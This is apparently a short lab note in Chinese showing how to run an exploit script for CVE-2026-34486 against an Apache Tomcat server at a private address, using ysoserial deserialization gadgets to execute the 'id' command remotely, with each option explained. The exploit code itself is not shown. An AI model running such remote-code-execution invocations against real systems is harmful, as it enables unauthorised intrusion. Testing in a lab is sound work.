```
cd ~/CVE-2026-34486
python3 exp.py -t 10.0.2.4 -p 4000 --ysoserial ~/ysoserial-all.jar --tomcat-lib ~/apache-tomcat-9.0.116/lib --rce "id"
```
**这条命令的意思是：**

- `-t 10.0.2.4`：目标 IP
    
- `-p 4000`：目标端口
    
- `--ysoserial ~/ysoserial-all.jar`：指定 jar 文件
    
- `--tomcat-lib ~/apache-tomcat-9.0.116/lib`：指定 Tomcat 库目录
    
- `--rce "id"`：执行 `id` 命令并尝试获取输出
